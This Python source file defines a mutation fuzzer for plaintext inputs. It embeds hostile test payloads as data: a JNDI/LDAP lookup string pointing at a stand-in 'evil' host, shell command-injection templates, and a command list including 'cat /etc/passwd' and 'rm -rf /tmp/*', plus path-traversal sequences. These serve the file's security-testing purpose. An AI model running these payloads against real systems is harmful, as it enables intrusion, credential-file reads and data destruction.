import random
import re
import string

from .base_fuzzer import BaseFuzzer


WHITESPACE_PATTERNS = [
    " ",
    "\t",
    "\r",
    "\n",
    "\r\n",
    "    ",
    "\t\t",
    " \t ",
    "\x00",
    "\u2028",
]

NEGATIVE_NUMBERS = ["-1", "-4", "-16", "-64", "-256", "-1024", "-4096", "-999999"]

INJECTION_TEMPLATES = [
    "{0}{0}{0}",
    "${jndi:ldap://evil/{0}}",
    "<<EOF\n{0}\nEOF",
    "';{0};#",
    "`{0}`",
    "|| {0} #",
]

COMMAND_DICTIONARY = [
    "ls -la",
    "cat /etc/passwd",
    "curl http://example.com",
    "rm -rf /tmp/*",
    "id",
    "touch owned",
]

PATH_SEGMENTS = [
    "../",
    "..\\",
    "/../../../../",
    "..//..//",
]


class PlaintextFuzzer(BaseFuzzer):
    def __init__(self, example_input):
        super().__init__(example_input)
        try:
            decoded = example_input.decode("utf-8", errors="ignore")
        except Exception:
            decoded = ""
        self.original_text = decoded
        self.text = decoded.replace("\r\n", "\n").replace("\r", "\n")
        self.lines = [ln for ln in self.text.split("\n") if ln]
        token_pattern = re.compile(r"[A-Za-z0-9_\-\./]+")
        self.words = token_pattern.findall(self.text)
        self.numbers = re.findall(r"-?\d+", self.text)

    def _encode(self, text):
        if isinstance(text, bytes):
            return text
        return text.encode("utf-8", errors="ignore")

    def _random_ascii(self, min_len=1, max_len=32):
        length = random.randint(min_len, max_len)
        alphabet = string.ascii_letters + string.digits + string.punctuation
        return "".join(random.choice(alphabet) for _ in range(length))

    # ------------------- Mutation helpers ------------------------------------

    def _line_mutation(self):
        lines = list(self.lines) or self.text.splitlines()
        if not lines:
            return self.example_input
        mutated = lines[:]
        action = random.choice(["delete", "duplicate", "shuffle", "insert", "join"])
        if action == "delete" and mutated:
            del mutated[random.randrange(len(mutated))]
        elif action == "duplicate" and mutated:
            idx = random.randrange(len(mutated))
            mutated.insert(random.randrange(len(mutated) + 1), (mutated[idx] + "\n") * random.randint(1, 4))
        elif action == "shuffle" and len(mutated) > 1:
            random.shuffle(mutated)
        elif action == "insert":
            payload = self._random_ascii(4, 64)
            mutated.insert(random.randrange(len(mutated) + 1), payload)
        elif action == "join" and len(mutated) > 1:
            idx = random.randrange(len(mutated) - 1)
            mutated[idx] = mutated[idx] + mutated[idx + 1]
            del mutated[idx + 1]
        return self._encode("\n".join(mutated))

    def _word_mutation(self):
        words = self.words or re.findall(r"[A-Za-z0-9_]+", self.text)
        if not words:
            return self.example_input
        choice = random.choice(words)
        mutation_type = random.choice(["repeat", "flipcase", "replace", "format", "command"])
        if mutation_type == "repeat":
            mutated = choice * random.randint(2, 6)
        elif mutation_type == "flipcase":
            mutated = "".join(ch.swapcase() if ch.isalpha() else ch for ch in choice)
        elif mutation_type == "replace":
            mutated = self._random_ascii(len(choice), len(choice) + 8)
        elif mutation_type == "command":
            mutated = random.choice(COMMAND_DICTIONARY)
        else:
            mutated = choice + "%s%n%x%d%p"
        text = self.text or self.original_text
        pos = random.randint(0, len(text)) if text else 0
        return self._encode(text[:pos] + mutated + text[pos:])

    def _whitespace_mutation(self):
        text = self.text or self.original_text
        if not text:
            return self.example_input
        pattern = random.choice(WHITESPACE_PATTERNS)
        mutated = re.sub(r"\s+", pattern, text)
        if random.random() < 0.5:
            mutated = pattern * random.randint(5, 25) + mutated + pattern * random.randint(5, 25)
        return self._encode(mutated)

    def _numeric_mutation(self):
        text = self.text or self.original_text
        if not text:
            return self.example_input

        def repl(match):
            options = [
                str(2 ** 31 - 1),
                str(2 ** 31),
                hex(random.randint(0, 2 ** 32)),
                str(random.randint(0, 10 ** 8)),
            ] + NEGATIVE_NUMBERS
            return random.choice(options)

        mutated = re.sub(r"-?\d+", repl, text, count=random.randint(1, 5))
        return self._encode(mutated)

    def _control_block(self):
        size = random.randint(8, 64)
        block = "".join(chr(random.randint(0, 31)) for _ in range(size))
        if random.random() < 0.5:
            block += "\x1b[31m"
        return self._encode(block)

    def _template_payload(self):
        template = random.choice(INJECTION_TEMPLATES)
        insertion = self._random_ascii(4, 24)
        try:
            return self._encode(template.format(insertion))
        except Exception:
            return self._encode(template + insertion)

    def _path_traversal(self):
        depth = random.randint(3, 10)
        traversal = random.choice(PATH_SEGMENTS) * depth
        filename = self._random_ascii(3, 8) + random.choice([".conf", ".log", ".ini"])
        return self._encode(traversal + filename)

    def _repeat_block(self):
        block = self.text or self.original_text
        if not block:
            block = self.example_input.decode("latin-1", errors="ignore")
        block = block.strip()
        return self._encode((block + "\n") * random.randint(5, 20))

    def _dictionary_swap(self):
        text = self.text or self.original_text
        if not text:
            return self.example_input
        tokens = ["admin", "root", "user", "password", "token", "session", "flag"]
        target = random.choice(tokens)
        replacement = random.choice(tokens) + self._random_ascii(1, 4)
        mutated = text.replace(target, replacement, 1)
        return self._encode(mutated)

    # ------------------- Generator -------------------------------------------

    def generate(self):
        """Generate mutated plaintext inputs."""
        yield b""
        yield self.example_input
        yield self._repeat_block()
        yield self._encode(self.text.upper() if self.text else "")
        yield self._encode(self.text.lower() if self.text else "")

        if self.text:
            for neg in NEGATIVE_NUMBERS:
                candidate = re.sub(r"-?\d+", neg, self.text, count=1)
                if candidate and candidate != self.text:
                    yield self._encode(candidate)

        deterministic_templates = [
            self._path_traversal,
            self._template_payload,
        ]
        for tmpl in deterministic_templates:
            yield tmpl()

        strategies = [
            lambda: self.mutate_bytes(self.example_input),
            self._line_mutation,
            self._word_mutation,
            self._whitespace_mutation,
            self._numeric_mutation,
            self._control_block,
            self._template_payload,
            self._path_traversal,
            self._repeat_block,
            self._dictionary_swap,
        ]

        while True:
            strategy = random.choice(strategies)
            yield strategy()
